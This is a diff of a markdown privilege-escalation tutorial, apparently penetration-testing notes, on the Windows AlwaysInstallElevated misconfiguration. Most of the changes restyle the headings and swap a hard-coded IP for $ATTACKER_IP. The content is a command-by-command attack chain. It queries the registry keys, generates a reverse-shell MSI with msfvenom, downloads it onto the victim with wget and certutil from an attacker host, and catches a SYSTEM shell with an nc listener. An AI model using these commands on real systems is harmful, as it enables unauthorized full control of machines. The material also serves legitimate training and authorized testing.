@@ -1,5 +1,5 @@
 
-##  What is `AlwaysInstallElevated`?
+## <span style="color:#8BE9FD">What is `AlwaysInstallElevated`?</span>
 Windows has two registry keys that, when both set to `1`, allow **any user** to run `.msi` installer files **with SYSTEM privileges**.
 Windows has these 2 keys:
 ```
@@ -7,7 +7,7 @@ HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 ```
 If both are set to `1` or `0x1`, **any user can install MSI packages with SYSTEM privileges**.
-####  Check if the system is vulnerable
+#### <span style="color:#FFB86C">Check if the system is vulnerable</span>
 Run the following commands **on the target machine**:
 > **reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated**
 
@@ -16,22 +16,22 @@ Run the following commands **on the target machine**:
 **Vulnerable** if both return:
 `AlwaysInstallElevated REG_DWORD 0x1`
 
-## 1: Generate a malicious MSI payload
+## <span style="color:#8BE9FD">1: Generate a malicious MSI payload</span>
 On your **attacker machine (Kali/Parrot):**
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=445 -f msi > shell.msi
 ```
 This creates a file `shell.msi` that will **connect back to you as SYSTEM** when installed.
-## **2: Transfer the MSI to the victim**
+## <span style="color:#8BE9FD">**2: Transfer the MSI to the victim**</span>
 On the victim’s **PowerShell**:
 ```bash
 # wget 
-wget http://<YOUR-IP>/shell.msi -o shell.msi
+wget http://$ATTACKER_IP/shell.msi -o shell.msi
 
 # certutil
-certutil -urlcache -split -f "http://10.17.68.184:8000/shell.msi" shell.msi
+certutil -urlcache -split -f "http://$ATTACKER_IP:8000/shell.msi" shell.msi
 ```
-## 3: Install the MSI with SYSTEM privileges
+## <span style="color:#8BE9FD">3: Install the MSI with SYSTEM privileges</span>
 on Attacker machine run 
 ```
 rlwrap -f . -r nc -lvnp 445
